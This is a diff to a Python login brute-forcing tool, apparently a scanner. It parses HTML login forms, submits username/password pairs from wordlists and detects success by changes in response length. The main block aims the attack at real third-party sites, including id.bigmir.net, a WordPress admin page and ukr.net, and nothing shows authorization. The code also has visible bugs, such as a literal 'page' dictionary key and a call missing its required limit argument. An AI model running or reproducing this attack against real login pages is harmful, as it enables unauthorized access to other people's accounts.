@@ -1,10 +1,4 @@
 """TODO"""
-# https://medium.com/@ismailakkila/black-hat-python-brute-forcing-html-authentication-forms-455e8f85a70a
-# https://stackoverflow.com/questions/11747254/python-brute-force-algorithm
-# https://dev.to/presto412/how-i-cracked-the-captcha-on-my-universitys-website-237j
-
-# Good info about password lists:
-# http://blog.g0tmi1k.com/2011/06/dictionaries-wordlists/
 from helpers.colors import bcolors
 from tqdm import tqdm
 from bs4 import BeautifulSoup
@@ -91,13 +85,10 @@ class Loginer:
 				print(bcolors.FAIL + f"can't parse HTML from: {page}")
 		return login_pages
 
-	def bruteforce_url(self, url):
-		# get html of the page and retreive POST DATA (login, password fields, hidden fields, post url)
-
+	def bruteforce_url(self, url, limit):
 		""""""
-		# url = "http://leafus.com.ua/wp-login.php"
-		print()
-		print(f"Connecting to: {url}......\n")
+		attempts = 0
+		# get html of the page and retreive POST DATA (login, password fields, hidden fields, post url)
 		for user in self.users:
 			user = user.replace('\n', '')
 			average = 0
@@ -105,14 +96,13 @@ class Loginer:
 				password = password.replace('\n', '')
 				# Return login, password and other input.names + target url + method
 				r = requests.get(url)
-
 				try:
 					fillings = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))
 				except:
-					print("Can't fill form, skipping page")
+					print(bcolors.WARNING + "Can't fill form, skipping page" + bcolors.OKGREEN)
 					return
 
-				print(f"trying {user}: {password}", end='')
+				# print(f"trying {user}: {password}", end='')
 				payload = dict(fillings[:-2][0])
 				post_url = fillings[-2:-1][0]
 				method = fillings[-1:][0]
@@ -124,33 +114,45 @@ class Loginer:
 						cookies = dict(res.cookies)
 						p = s.post(post_url, data=payload, cookies=cookies)
 
-						###############################
 						if not average:
 							average = len(p.text)
-						elif abs(average - len(p.text)) >= 50:
-							print(bcolors.CYAN + "   login successful!" + bcolors.RESET)
-						print()
-						###############################
+						elif abs(average - len(p.text)) >= 100:
+							print(bcolors.CYAN + "   login successful!" + bcolors.OKGREEN)
+					attempts += 1
 
 				elif method == "GET":
 					with requests.Session() as s:
 						res = requests.get(post_url, params=payload)
-						###############################
 						if not average:
 							average = len(res.text)
-						elif abs(average - len(res.text)) >= 50:
-							print(bcolors.CYAN + "login successful!" + bcolors.RESET)
-						###############################
+						elif abs(average - len(res.text)) >= 100:
+							print(bcolors.CYAN + "login successful!" + bcolors.OKGREEN)
+					attempts += 1
 
 				else:
 					# super edge case
-					print('No method found in form, skipping page')
+					print(bcolors.WARNING + 'No method found in form, skipping page' + bcolors.OKGREEN)
 					return
+		if attempts > limit:
+			print(bcolors.CYAN + f"Bruteforce possible! page: {url}" + bcolors.OKGREEN)
+			return False
+		else:
+			print(bcolors.FAIL + f"Bruteforce attack not allowed : {url}" + bcolors.OKGREEN)
+			return attempts
 
 
 	def bruteforce_attack(self, page_urls):
+		stats = {}
 		for page in page_urls:
-			self.bruteforce_url(page)
+			attempts = self.bruteforce_url(page)
+			if attempts:
+				stats["page"] = attempts
+		if stats:
+			print(bcolors.OKGREEN + f"Pages where bruteforce possible:")
+			for page in stats:
+				if stats[page]:
+					print(bcolors.CYAN + page + bcolors.OKGREEN)
+
 
 
 	def vocabulary_attack(self, page_urls):
@@ -160,15 +162,8 @@ class Loginer:
 if __name__ == "__main__":
 	from configer import Configer
 
-	settings = {"local": False,
-			"page_limit": None,
-			}
+	settings = {"local": False, "page_limit": None,}
 	c = Configer("https://inmac.org/login/", settings)
 	log = Loginer(c)
 	
-	pages = ["http://leafus.com.ua/", "http://leafus.com.ua/wp-admin", "http://indiana.tours/coming-soon/", 
-			 "https://stackoverflow.com/", "https://inmac.org/login/"
-			 ]
-
-	# log.filter_pages(pages)
 	log.bruteforce_attack(['https://id.bigmir.net/', 'http://leafus.com.ua/wp-admin', 'https://www.ukr.net/'])
